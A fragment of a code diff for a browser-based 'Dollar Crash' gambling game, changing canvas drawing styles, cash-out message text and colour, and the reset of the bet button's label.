+            crashCtx.font = '24px "Font Awesome 6 Free"';
             crashCtx.fontWeight = '900';
-            crashCtx.shadowColor = '#EF4444';
-            crashCtx.shadowBlur = 15;
-            crashCtx.fillText('\uf135', -10, 8);
+            crashCtx.shadowColor = '#10B981';
+            crashCtx.shadowBlur = 20;
+            crashCtx.fillText('\uf135', -12, 8);
             crashCtx.restore();
         }
 
@@ -2533,10 +2582,10 @@
             const lastP = graphPoints[graphPoints.length - 1] || { x: w/2, y: h/2 };
 
             crashCtx.beginPath();
-            crashCtx.arc(lastP.x, lastP.y, 35, 0, Math.PI * 2);
-            crashCtx.fillStyle = 'rgba(239, 68, 68, 0.8)';
+            crashCtx.arc(lastP.x, lastP.y, 45, 0, Math.PI * 2);
+            crashCtx.fillStyle = 'rgba(239, 68, 68, 0.85)';
             crashCtx.shadowColor = '#EF4444';
-            crashCtx.shadowBlur = 30;
+            crashCtx.shadowBlur = 40;
             crashCtx.fill();
         }
 
@@ -2560,19 +2609,20 @@
 
             const status = document.getElementById('crashStatusText');
             status.innerText = `CASHED OUT AT ${winMultiplier.toFixed(2)}x! (+$${winAmount.toFixed(2)})`;
-            status.style.color = 'var(--accent-green)';
+            status.style.color = '#10B981';
 
             addCrashHistory(winMultiplier, true);
 
             sendTelegramNotification(`<b>🚀 Dollar Crash Cash Out Win!</b>\n\nUser <b>@${currentUserData.profile.username}</b> cashed out at <b>${winMultiplier.toFixed(2)}x</b> and won <b>+$${winAmount.toFixed(2)}</b>!`);
 
-            alert(`CASH OUT SUCCESSFUL!\n\nYou cashed out at ${winMultiplier.toFixed(2)}x and won +$${winAmount.toFixed(2)} credited to your balance!`);
+            alert(`CASH OUT SUCCESSFUL!\n\nYou cashed out at ${winMultiplier.toFixed(2)}x and won +$${winAmount.toFixed(2)} credited to your Available Balance!`);
         }
 
         function resetCrashControls() {
             isBetPlaced = false;
             const betBtn = document.getElementById('btnPlaceBet');
             betBtn.disabled = false;
+            betBtn.innerText = "PLACE BET";
             betBtn.style.opacity = '1';
             betBtn.style.pointerEvents = 'auto';
 
